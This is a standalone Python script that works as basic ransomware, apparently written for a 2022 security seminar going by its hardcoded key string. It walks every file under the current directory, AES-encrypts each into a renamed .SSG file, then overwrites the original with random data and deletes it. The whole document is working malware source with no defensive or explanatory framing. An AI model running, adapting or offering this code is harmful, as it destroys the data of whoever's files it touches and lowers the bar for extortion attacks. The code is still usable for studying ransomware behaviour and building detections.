import base64
import os
import random
import string
import sys

from Cryptodome import Random
from Cryptodome.Cipher import AES
from Cryptodome.Hash import SHA256

def find_files(path):
    found_files = []
    for root, _, files in os.walk(path):
        for file in files:
            found_files.append(os.path.join(root, file))

    return found_files

def generate_data(length):
    return ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(length))

def destory_file(filename, passes=1):
    if not os.path.isfile(filename):
        return False

    filesize = os.path.getsize(filename)

    with open(filename, 'w') as f:
        for _ in range(int(passes)):
            data = generate_data(filesize)
            f.write(data)
            f.seek(0, 0)

    os.remove(filename)

def encrypt(key, filename):
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    out = os.path.join(os.path.dirname(filename), '%s.SSG' % base64.b64encode(os.path.basename(filename).encode()).decode('utf-8'))
    filesize = str(os.path.getsize(filename)).zfill(16)

    with open(filename, 'rb') as infile:
        with open(out, 'wb') as outfile:
            outfile.write(filesize.encode())
            outfile.write(iv)
            while True:
                block = infile.read(AES.block_size)

                if(not len(block)):
                    break

                elif len(block) % 16 != 0:
                    block = (block.decode('utf-8') + ' ' * (16 - (len(block) % 16))).encode()

                outfile.write(cipher.encrypt(block))

def main():
    key = base64.b64encode('2022ssgsummerseminar'.encode()).decode('utf-8')
    target_files = find_files(os.getcwd())
    for file in target_files:
        if os.path.basename(file).endswith('.SSG'):
            print('[!] %s: already encrypted.' % str(file))
        elif file == os.path.join(os.getcwd(), sys.argv[0]):
            pass
        else:
            encrypt(SHA256.new(key.encode()).digest(), str(file))
            print('[*] %s: done encrypt file' % str(file))
            destory_file(file)

if __name__ == '__main__':
    main()
